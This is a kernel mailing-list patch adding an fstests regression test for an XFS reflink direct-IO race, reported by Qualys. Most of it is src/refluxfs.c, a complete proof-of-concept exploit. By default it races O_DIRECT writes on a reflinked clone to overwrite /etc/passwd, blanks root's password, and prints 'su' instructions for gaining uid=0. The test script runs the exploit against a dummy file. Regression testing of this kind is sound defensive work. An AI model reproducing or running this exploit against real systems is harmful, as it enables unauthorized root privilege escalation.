Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8DF863AD530;
	Wed, 19 Aug 2026 15:54:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787154875; cv=none; b=MylX3CZLbfrc7R1Vu++3WXE3QLhbk+ikcEyDoDWrcbXTuZpkmblPWVwgLcd0PWay7dYYZmm2GKPZp2d4CYgHRq3sWzo1VX9nTAa5eK28ffEP1y5SL9pk3PFbLC8+SVQQsaTI6Um0oID/qqmnPgD7tHevlcfTpXJqwoBhedb5SCg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787154875; c=relaxed/simple;
	bh=oV0cYxhpStVEWlW/XDKnHCNlm0NuQbf6NkQu2qmSSCg=;
	h=Date:From:To:Cc:Subject:Message-ID:MIME-Version:Content-Type:
	 Content-Disposition; b=iA4Z0xZOd6/6hVIAFy87h7YkYOZ5TyfL7AX4XIZGulzJedaJhQPkG6eToE3IWGSfSBHE5v2fSTtNRfP0aAHFlHMBuyZd6/ejJVtHx03W+rSF+VzSwviGLzweyQuEq2CU0wqxhZLNyp0/JWCUYuMQYWW4EZZ31N+kC5q1OP/Fxvk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=CSJa4iiY; arc=none smtp.client-ip=100.103.45.18
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="CSJa4iiY"
Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id C4A591F00A3A;
	Wed, 19 Aug 2026 15:54:32 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1787154872;
	bh=GYCcLPuKX0Poywm2Eu628JadO3+PONIsxV88+c2ozUc=;
	h=Date:From:To:Cc:Subject;
	b=CSJa4iiYGgHYqFeu/70iXDRI8xYFEvY+KvD2Jz7XrsyjVj1kPmwxom/I//Ju+l075
	 ejaTIozHzkOGj6DLa1vg+rYNScnBBLxDSf66CXUhl6dTO64xz65wr1dMjGAFFIsadW
	 mQYquvjTiEYOgSS5j+6r6oO1aV/dKzTkrbwHrf/TRE8QusG/EJTObDKhm2Hte4sD58
	 ur9xy7o+zD37C/N6vGQbJKSTHOaTwuo+WZZGJoeiCRdJCXXWfF33zTrjIShdYTf3yD
	 Wq76niPwCUlUnWYIoeGCnAuJizq8jZStGjS77aB6a8X+iJkabFdR2/Hbr+W+kRvZc8
	 PVj0XiDT00IIg==
Date: Wed, 19 Aug 2026 08:54:32 -0700
From: "Darrick J. Wong" <djwong@kernel.org>
To: Zorro Lang <zlang@kernel.org>
Cc: qsa@qualys.com, fstests <fstests@vger.kernel.org>,
	xfs <linux-xfs@vger.kernel.org>
Subject: [PATCH] generic: regression test for refluxfs fixes
Message-ID: <20260819155432.GC839663@frogsfrogsfrogs>
Precedence: bulk
X-Mailing-List: linux-xfs@vger.kernel.org
List-Id: <linux-xfs.vger.kernel.org>
List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

From: Darrick J. Wong <djwong@kernel.org>

Regression test for refluxfs as found by Qualys.

Signed-off-by: "Darrick J. Wong" <djwong@kernel.org>
---
 .gitignore             |    1 
 src/Makefile           |    2 
 src/refluxfs.c         |  461 ++++++++++++++++++++++++++++++++++++++++++++++++
 tests/generic/1956     |   58 ++++++
 tests/generic/1956.out |    2 
 5 files changed, 523 insertions(+), 1 deletion(-)
 create mode 100644 src/refluxfs.c
 create mode 100755 tests/generic/1956
 create mode 100644 tests/generic/1956.out

diff --git a/.gitignore b/.gitignore
index d52ba4ad30852b..b5d85c9451f0a8 100644
--- a/.gitignore
+++ b/.gitignore
@@ -126,6 +126,7 @@ tags
 /src/pwrite_mmap_blocked
 /src/randholes
 /src/readdir-while-renames
+/src/refluxfs
 /src/rename
 /src/renameat2
 /src/resvtest
diff --git a/src/Makefile b/src/Makefile
index 0ff607ae15930d..04a73b76546241 100644
--- a/src/Makefile
+++ b/src/Makefile
@@ -36,7 +36,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
 	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
 	detached_mounts_propagation ext4_resize t_readdir_3 splice2pipe \
 	uuid_ioctl t_snapshot_deleted_subvolume fiemap-fault min_dio_alignment \
-	rw_hint btrfs_ioctl
+	rw_hint btrfs_ioctl refluxfs
 
 EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
 	      btrfs_crc32c_forged_name.py popdir.pl popattr.py \
diff --git a/src/refluxfs.c b/src/refluxfs.c
new file mode 100644
index 00000000000000..6367c0390f681d
--- /dev/null
+++ b/src/refluxfs.c
@@ -0,0 +1,461 @@
+/* refluxfs.c -- RefluXFS PoC (CVE-2026-XXXXX)
+ *
+ * This PoC targets /etc/passwd (always world-readable, arch-independent, easy
+ * to verify and revert).  It never opens the target for write; the corrupting
+ * DIO is issued against the attacker-owned CLONE, whose stale imap points at
+ * the target's block.  Before racing, it saves a full BYTE-COPY backup of the
+ * target (read/write -- never reflink, so it takes no refcount on the block).
+ * On success it leaves /etc/passwd modified so you can `su` (empty password),
+ * confirm uid=0, and restore from the backup.
+ *
+ * Build:  cc -O2 -pthread -o refluxfs refluxfs.c
+ * Run:    ./refluxfs                 # zero-arg defaults; safe to Ctrl-C
+ *
+ * Exit:   0  vulnerable (race fired; target left modified, backup saved)
+ *         1  precondition unmet, or runtime error (with a specific reason)
+ *         2  race did not fire (budget exhausted or interrupted)
+ */
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdint.h>
+#include <time.h>
+#include <sys/ioctl.h>
+#include <sys/utsname.h>
+#include <sys/stat.h>
+#include <sys/vfs.h>
+#include <linux/fs.h>
+#include <linux/magic.h>
+#include <linux/fiemap.h>
+#include <stdatomic.h>
+
+#ifndef FICLONE
+#define FICLONE _IOW(0x94, 9, int)
+#endif
+#ifndef XFS_SUPER_MAGIC
+#define XFS_SUPER_MAGIC 0x58465342
+#endif
+
+#define BLK 4096
+
+/* ---- configuration (overridable via CLI) --------------------------------- */
+static const char *target_path   = "/etc/passwd";
+static const char *clone_dir     = "/var/tmp";
+static int         nr_writers    = 32;
+static int         nr_pressure   = 8;
+static int         budget_s      = 300;
+
+/* ---- state --------------------------------------------------------------- */
+static char  workdir[512], clone_path[600], backup_path[600];
+static int   target_fd_ro = -1;
+static unsigned char golden[BLK];        /* first block of target, verbatim   */
+static ssize_t golden_len;               /* == min(i_size, BLK)               */
+static unsigned char *dio_buf;           /* BLK-aligned; every writer pwrites */
+static int   keep_backup;                /* set on success; gates atexit()    */
+static atomic_int  sigint;               /* set by handler; read only by main */
+static atomic_int  stop;                 /* set by main; read by threads      */
+static long  rounds;
+static pthread_barrier_t bar;
+
+/* ---- helpers ------------------------------------------------------------- */
+__attribute__((format(printf, 2, 3)))
+static void say(const char *tag, const char *fmt, ...)
+{
+    va_list ap; va_start(ap, fmt);
+    fprintf(stderr, "[%s] ", tag);
+    vfprintf(stderr, fmt, ap);
+    fprintf(stderr, "\n");
+    va_end(ap);
+}
+#define OK(...)   say("+", __VA_ARGS__)
+#define BAD(...)  say("!", __VA_ARGS__)
+#define INFO(...) say("*", __VA_ARGS__)
+
+static void die(int code, const char *why, const char *hint)
+{
+    BAD("%s: %s", why, strerror(errno));
+    if (hint) INFO("%s", hint);
+    exit(code);
+}
+
+static void on_signal(int sig)
+{
+    (void)sig;
+    atomic_store(&sigint, 1);
+}
+
+/* Registered with atexit() as soon as workdir exists; runs on every exit
+ * path (die(), preflight refusal, timeout, success).  Always removes clone
+ * and pressure files; removes backup + workdir unless the run succeeded. */
+static void cleanup(void)
+{
+    unlink(clone_path);
+    for (int i = 0; i < nr_pressure; i++) {
+        char p[600]; snprintf(p, sizeof p, "%s/press.%d", workdir, i); unlink(p);
+    }
+    if (!keep_backup) {
+        unlink(backup_path);
+        rmdir(workdir);
+    }
+}
+
+/* ---- preflight ----------------------------------------------------------- */
+
+static int same_fs(const char *a, const char *b)
+{
+    struct stat sa, sb;
+    if (stat(a, &sa) || stat(b, &sb)) return -1;
+    return sa.st_dev == sb.st_dev;
+}
+
+#if 0
+static int is_xfs(const char *p)
+{
+    struct statfs s;
+    if (statfs(p, &s)) return -1;
+    return s.f_type == XFS_SUPER_MAGIC;
+}
+#endif
+
+/* FIEMAP: is the target's first extent already shared (refcount > 1)?
+ * If so the race can never see refcount==1. */
+static int target_first_extent_shared(void)
+{
+    union {
+        struct fiemap fm;
+        char raw[sizeof(struct fiemap) + sizeof(struct fiemap_extent)];
+    } q;
+    memset(&q, 0, sizeof q);
+    q.fm.fm_length = BLK;
+    q.fm.fm_flags = FIEMAP_FLAG_SYNC;
+    q.fm.fm_extent_count = 1;
+    if (ioctl(target_fd_ro, FS_IOC_FIEMAP, &q) < 0) return -1; /* unknown */
+    if (q.fm.fm_mapped_extents < 1) return -1;
+    return (q.fm.fm_extents[0].fe_flags & FIEMAP_EXTENT_SHARED) ? 1 : 0;
+}
+
+static void preflight(void)
+{
+    struct stat st;
+
+    /* 1. target readable */
+    target_fd_ro = open(target_path, O_RDONLY);
+    if (target_fd_ro < 0)
+        die(1, "open target O_RDONLY",
+            "Target must be world-readable. /etc/passwd is on every distro.");
+    if (fstat(target_fd_ro, &st)) die(1, "fstat target", NULL);
+    golden_len = pread(target_fd_ro, golden, BLK, 0);
+    if (golden_len < 0) die(1, "read target", NULL);
+    OK("target %s: readable, %lld bytes (using first %zd)",
+       target_path, (long long)st.st_size, golden_len);
+    if (st.st_blksize != BLK)
+        INFO("note: st_blksize=%ld != %d -- this PoC assumes 4K fs blocks "
+             "and may false-negative otherwise.", (long)st.st_blksize, BLK);
+
+    /* We only assume line 1 is `root:x:...` -- universal on shadow-using Linux.
+     * `root::...` means a previous run already emptied the password field. */
+    if (golden_len >= 6 && !memcmp(golden, "root::", 6)) {
+        BAD("target line 1 already has an empty password field (root::).");
+        INFO("A previous run left it modified. Restore first (as root, or `su`):");
+        INFO("    dd if=%s/.refluxfs-%d-PID/target.orig of=%s",
+             clone_dir, (int)getuid(), target_path);
+        INFO("(ls -d %s/.refluxfs-%d-*  to find the right PID directory;",
+             clone_dir, (int)getuid());
+        INFO(" use dd -- cp, and recent coreutils cat, may reflink.)");
+        exit(1);
+    }
+    if (golden_len < 8 || memcmp(golden, "root:x:", 7) ||
+        !memchr(golden, '\n', golden_len)) {
+        BAD("target line 1 is not \"root:x:...\\n\" -- unexpected format.");
+        INFO("This PoC's payload assumes the standard shadow-backed root entry.");
+        INFO("Use -t to point at a different target or adjust the payload.");
+        exit(1);
+    }
+
+#if 0
+    /* 2. target on XFS */
+    int x = is_xfs(target_path);
+    if (x < 0) die(1, "statfs target", NULL);
+    if (!x) {
+        BAD("target is not on XFS (f_type != XFS_SUPER_MAGIC).");
+        INFO("RefluXFS only affects XFS with reflink=1 (mkfs.xfs default since");
+        INFO("xfsprogs 5.1.0; backported by Red Hat for RHEL 8 GA).  Default root");
+        INFO("fs on RHEL/CentOS/Rocky/Alma/OL/CloudLinux 8+, Fedora Server 31+,");
+        INFO("Amazon Linux 2023.");
+        exit(1);
+    }
+    OK("target is on XFS");
+#endif
+
+    /* 3. clone_dir on the same superblock */
+    if (access(clone_dir, W_OK)) die(1, "clone dir not writable",
+        "Need a writable directory on the SAME XFS filesystem as the target.");
+    int s = same_fs(target_path, clone_dir);
+    if (s < 0) die(1, "stat clone dir", NULL);
+    if (!s) {
+        BAD("clone dir %s is NOT on the same filesystem as %s (st_dev differs).",
+            clone_dir, target_path);
+        INFO("FICLONE returns -EXDEV across superblocks. Use -d with a writable");
+        INFO("directory on the target's mount (findmnt -T %s).", target_path);
+        exit(1);
+    }
+    OK("clone dir %s: writable, same st_dev as target", clone_dir);
+
+    /* 4. workdir */
+    snprintf(workdir, sizeof workdir, "%s/.refluxfs-%d-%d",
+             clone_dir, (int)getuid(), (int)getpid());
+    if (mkdir(workdir, 0700) && errno != EEXIST)
+        die(1, "mkdir workdir", NULL);
+    snprintf(clone_path,  sizeof clone_path,  "%s/clone",       workdir);
+    snprintf(backup_path, sizeof backup_path, "%s/target.orig", workdir);
+    atexit(cleanup);           /* every exit() from here on cleans workdir */
+
+    /* Full BYTE-COPY backup of target (read/write, never FICLONE/
+     * copy_file_range -- must not take a refcount on the target's block). */
+    {
+        int bfd = open(backup_path, O_WRONLY|O_CREAT|O_TRUNC, 0600);
+        if (bfd < 0) die(1, "open backup", NULL);
+        unsigned char buf[8192]; ssize_t n; off_t off = 0;
+        while ((n = pread(target_fd_ro, buf, sizeof buf, off)) > 0) {
+            if (write(bfd, buf, n) != n) die(1, "write backup", NULL);
+            off += n;
+        }
+        if (n < 0) die(1, "read target for backup", NULL);
+        fsync(bfd); close(bfd);
+        OK("workdir %s", workdir);
+        OK("backup  %s  (%lld bytes, byte-copy -- no reflink taken)",
+           backup_path, (long long)off);
+    }
+
+    /* 5. abort if target's first extent is already shared (checked BEFORE we
+     *    FICLONE ourselves and create a share). */
+    int sh = target_first_extent_shared();
+    if (sh == 1) {
+        BAD("target's first extent is ALREADY SHARED (FIEMAP_EXTENT_SHARED).");
+        INFO("The race needs refcount(X) to drop to exactly 1; a pre-existing");
+        INFO("reflink (e.g. `cp --reflink=auto` backup, coreutils >= 9.0 default)");
+        INFO("keeps it >= 2 and the race can never fire. Reset primitive:");
+        INFO("    chsh -s /usr/bin/bash");
+        INFO("    (or `-s /bin/bash` if that says 'Shell not changed.'; on");
+        INFO("     RHEL-family, chsh is in the optional util-linux-user pkg)");
+        INFO("This rewrites /etc/passwd via rename(2) as a fresh unshared inode.");
+        exit(1);
+    } else if (sh == 0) {
+        OK("target's first extent is not pre-shared (refcount==1)");
+    } else {
+        INFO("cannot determine sharing state via FIEMAP -- proceeding.");
+    }
+
+    /* 6. FICLONE actually works (=> reflink=1) */
+    int c = open(clone_path, O_RDWR|O_CREAT|O_TRUNC, 0600);
+    if (c < 0) die(1, "open clone", NULL);
+    if (ioctl(c, FICLONE, target_fd_ro) < 0) {
+        int e = errno;
+        BAD("FICLONE(clone <- target) failed: %s", strerror(e));
+        if (e == EOPNOTSUPP)
+            INFO("This XFS was made with reflink=0 (xfsprogs < 5.1.0 or explicit).");
+        else if (e == EXDEV)
+            INFO("Different filesystem after all -- pick another -d directory.");
+        close(c);
+        exit(1);
+    }
+    close(c);
+    OK("FICLONE works -- filesystem has reflink=1");
+
+    /* 7. O_DIRECT open + one aligned pwrite actually work.  All writers share
+     *    this one buffer -- payload never changes and pwrite() only reads it. */
+    if ((errno = posix_memalign((void **)&dio_buf, BLK, BLK)))
+        die(1, "posix_memalign", NULL);
+    memset(dio_buf, 0, BLK);
+    c = open(clone_path, O_RDWR|O_DIRECT);
+    if (c < 0) die(1, "open clone O_DIRECT",
+                "O_DIRECT is required to reach xfs_direct_write_iomap_begin().");
+    if (pwrite(c, dio_buf, BLK, 0) != BLK)
+        die(1, "O_DIRECT pwrite (alignment?)",
+            "This PoC assumes 4K DIO alignment (default on all target distros).");
+    close(c);
+    OK("O_DIRECT open + %d-byte aligned pwrite work on clone", BLK);
+}
+
+/* ---- race machinery ------------------------------------------------------ */
+
+static int reclone(void)
+{
+    int c = open(clone_path, O_RDWR|O_CREAT|O_TRUNC, 0600);
+    if (c < 0) return -errno;
+    int r = ioctl(c, FICLONE, target_fd_ro) < 0 ? -errno : 0;
+    close(c);
+    return r;
+}
+
+static int target_changed(void)
+{
+    unsigned char b[BLK] = {0};
+    /* DIO landed on disk under a different address_space; drop the target's
+     * (stale, clean) cached page so we re-read from disk. */
+    posix_fadvise(target_fd_ro, 0, 0, POSIX_FADV_DONTNEED);
+    ssize_t n = pread(target_fd_ro, b, golden_len, 0);
+    return n == golden_len && memcmp(b, golden, golden_len) != 0;
+}
+
+static void *writer(void *arg)
+{
+    (void)arg;
+    for (;;) {
+        pthread_barrier_wait(&bar);          /* start of round */
+        if (atomic_load(&stop)) break;       /* set only by main, only when
+                                              * every writer is parked here */
+        int fd = open(clone_path, O_RDWR|O_DIRECT);
+        if (fd >= 0) { (void)!pwrite(fd, dio_buf, BLK, 0); close(fd); }
+        pthread_barrier_wait(&bar);          /* end of round */
+    }
+    return NULL;
+}
+
+static void *pressure(void *arg)
+{
+    char p[600];
+    snprintf(p, sizeof p, "%s/press.%d", workdir, (int)(intptr_t)arg);
+    int fd = open(p, O_RDWR|O_CREAT|O_TRUNC, 0600);
+    if (fd < 0) return NULL;
+    char b = 0;
+    while (!atomic_load(&stop)) {
+        /* return values irrelevant -- goal is XFS log traffic, not the data */
+        (void)!pwrite(fd, &b, 1, 0);
+        (void)!ftruncate(fd, BLK);
+        fdatasync(fd);
+        (void)!ftruncate(fd, 0);
+    }
+    close(fd);
+    return NULL;
+}
+
+/* ---- main ---------------------------------------------------------------- */
+
+static void usage(const char *argv0)
+{
+    fprintf(stderr,
+      "usage: %s [-t target] [-d clone-dir] [-s seconds] [-w writers] [-p pressure]\n"
+      "  -t  target file            (default /etc/passwd; line 1 must be root:x:...)\n"
+      "  -d  clone/work directory   (default /var/tmp; must be writable, same XFS as -t)\n"
+      "  -s  budget in seconds      (default 300)\n"
+      "  -w  concurrent DIO writers (default 32)\n"
+      "  -p  log-pressure threads   (default 8)\n",
+      argv0);
+}
+
+int main(int argc, char **argv)
+{
+    int opt;
+    while ((opt = getopt(argc, argv, "t:d:s:w:p:h")) != -1) switch (opt) {
+        case 't': target_path = optarg; break;
+        case 'd': clone_dir   = optarg; break;
+        case 's': budget_s    = atoi(optarg); if (budget_s    < 1) budget_s    = 1; break;
+        case 'w': nr_writers  = atoi(optarg); if (nr_writers  < 2) nr_writers  = 2; break;
+        case 'p': nr_pressure = atoi(optarg); if (nr_pressure < 0) nr_pressure = 0; break;
+        default:  usage(argv[0]); return 1;
+    }
+
+    struct utsname un;
+    uname(&un);
+    INFO("RefluXFS PoC -- kernel %s", un.release);
+
+    /* Install handlers BEFORE preflight so Ctrl-C after workdir/clone creation
+     * still reaches atexit(cleanup) instead of leaving a reflinked clone (which
+     * would keep the target's extent SHARED and defeat every later run). */
+    signal(SIGINT,  on_signal);
+    signal(SIGTERM, on_signal);
+
+    preflight();
+
+    /* Payload: surgical edit of line 1 only.  `root:x:...\n` -> `root::...\n\n`.
+     * Shift the byte range [6, nl] one position left over the `x`; the
+     * original `\n` at position nl is untouched, so we get two consecutive
+     * newlines and every byte from line 2 onward stays at its ORIGINAL
+     * offset -- correct for any file size, no entry straddles a boundary. */
+    memcpy(dio_buf, golden, golden_len);
+    ssize_t nl = 0;
+    while (nl < golden_len && golden[nl] != '\n') nl++;
+    memmove(dio_buf + 5, dio_buf + 6, (size_t)nl - 5);   /* nl>=7 by preflight */
+
+    /* threads */
+    if ((errno = pthread_barrier_init(&bar, NULL, nr_writers + 1)))
+        die(1, "pthread_barrier_init", NULL);
+    pthread_t *tw = calloc(nr_writers,  sizeof *tw);
+    pthread_t *tp = calloc(nr_pressure ? nr_pressure : 1, sizeof *tp);
+    if (!tw || !tp) { BAD("calloc: out of memory"); exit(1); }
+    for (int i = 0; i < nr_writers;  i++)
+        if ((errno = pthread_create(&tw[i], NULL, writer, NULL)))
+            die(1, "pthread_create writer", NULL);
+    for (int i = 0; i < nr_pressure; i++)
+        if ((errno = pthread_create(&tp[i], NULL, pressure, (void*)(intptr_t)i)))
+            die(1, "pthread_create pressure", NULL);
+
+    /* Race: reclone -> release all writers -> check target -> repeat. */
+    INFO("racing: %d writers + %d log-pressure threads, up to %ds ...",
+         nr_writers, nr_pressure, budget_s);
+    struct timespec t0, t; clock_gettime(CLOCK_MONOTONIC, &t0);
+    int rc = 2, e;
+    while (!atomic_load(&sigint)) {
+        if ((e = reclone()) < 0) {
+            fprintf(stderr, "\n");
+            BAD("reclone: %s", strerror(-e));
+            rc = 1; break;
+        }
+        rounds++;
+        pthread_barrier_wait(&bar);          /* release writers */
+        pthread_barrier_wait(&bar);          /* writers done   */
+        if (target_changed()) { rc = 0; break; }
+        clock_gettime(CLOCK_MONOTONIC, &t);
+        long el = t.tv_sec - t0.tv_sec;
+        if (el >= budget_s) break;
+        if ((rounds & 0xff) == 0)
+            fprintf(stderr, "\r    round %ld  (%lds, ~%ld r/s)   ",
+                    rounds, el, el ? rounds/el : rounds);
+    }
+    fprintf(stderr, "\n");
+
+    /* Shutdown. Every path out of the loop above leaves each writer either
+     * already at (or on its way to) the start-barrier -- the loop never breaks
+     * between the two barrier_wait()s, and writers only test `stop`, which is
+     * still 0.  Set `stop` now, cross the start-barrier once to release them;
+     * they observe `stop` immediately after and exit without a second wait. */
+    atomic_store(&stop, 1);
+    pthread_barrier_wait(&bar);
+    for (int i = 0; i < nr_writers;  i++) pthread_join(tw[i], NULL);
+    for (int i = 0; i < nr_pressure; i++) pthread_join(tp[i], NULL);
+    free(tw); free(tp);
+
+    if (rc == 0) {
+        keep_backup = 1;       /* atexit(cleanup) leaves backup + workdir */
+        char now[96] = {0};
+        if (pread(target_fd_ro, now, sizeof now - 1, 0) > 0)
+            for (char *q = now; *q; q++) if (*q == '\n') { *q = 0; break; }
+        BAD("=========================================================");
+        BAD("VULNERABLE -- %s block 0 overwritten via stale-imap DIO", target_path);
+        BAD("first line is now:  %s", now);
+        BAD("hit at round %ld", rounds);
+        BAD("=========================================================");
+        fprintf(stderr, "\n");
+        INFO("Confirm:  su                 (empty password -> `id` shows uid=0)");
+        INFO("Restore:  # dd if=%s of=%s", backup_path, target_path);
+        INFO("          (as root; dd is read/write. Do NOT use cp or cat: cp");
+        INFO("           reflinks via FICLONE by default (>=9.0), and recent");
+        INFO("           coreutils cat uses copy_file_range() which also");
+        INFO("           reflinks -- either would leave the target SHARED.)");
+    } else if (rc == 2) {
+        OK("race did not fire in %ld rounds.", rounds);
+        if (!atomic_load(&sigint))
+            INFO("Kernel is likely PATCHED (or window too tight -- retry with larger -s / -w).");
+    }
+    return rc;
+}
diff --git a/tests/generic/1956 b/tests/generic/1956
new file mode 100755
index 00000000000000..bc926e4685408e
--- /dev/null
+++ b/tests/generic/1956
@@ -0,0 +1,58 @@
+#! /bin/bash
+# SPDX-License-Identifier: GPL-2.0
+# Copyright (c) 2026 Oracle.  All Rights Reserved.
+#
+# FS QA Test No. 1956
+#
+# Regression test for refluxfs, which is an exploit for a race condition in
+# XFS' directio copy-on-write code that can be used to rewrite shared blocks
+# to gain root privileges.
+#
+. ./common/preamble
+_begin_fstest auto rw clone
+
+_cleanup()
+{
+	cd /
+	rm -r -f $tmp.*
+	test -n "$dummydir" && rm -r -f "$dummydir"
+}
+
+. ./common/reflink
+
+_require_test_program "refluxfs"
+_require_test_reflink
+_require_odirect
+_require_user fsgqa
+_require_group fsgqa
+
+_fixed_by_fs_commit xfs 2f4acd0fcd862e \
+	"xfs: resample the data fork mapping after cycling ILOCK"
+
+dummydir="$TEST_DIR/$seq"
+
+rm -r -f "$dummydir"
+mkdir "$dummydir"
+
+fakedata="root:x:0:0:root:/root:/bin/bash"
+echo "$fakedata" > $dummydir/datafile
+
+# Try to trick the system into letting a different user make a reflink copy of
+# the data file and rewrite the shared data block to corrupt the contents.
+mkdir $dummydir/workdir
+chown $qa_user:$qa_group $dummydir/workdir
+_su $qa_user -c "$here/src/refluxfs -t $dummydir/datafile -d $dummydir/workdir -s $((30 * TIME_FACTOR))" &>> $seqres.full
+res=$?
+case "$res" in
+0)	echo "vulnerable to corruption";;
+1)	echo "runtime error";;
+2)	echo "corruption not observed";;
+*)	echo "unknown outcome $res";;
+esac
+
+result="$(cat $dummydir/datafile)"
+test "$result" != "$fakedata" && \
+	echo "shared data block rewritten, you have been pwned!"
+
+# success, all done
+_exit 0
diff --git a/tests/generic/1956.out b/tests/generic/1956.out
new file mode 100644
index 00000000000000..55d8be979b1486
--- /dev/null
+++ b/tests/generic/1956.out
@@ -0,0 +1,2 @@
+QA output created by 1956
+corruption not observed
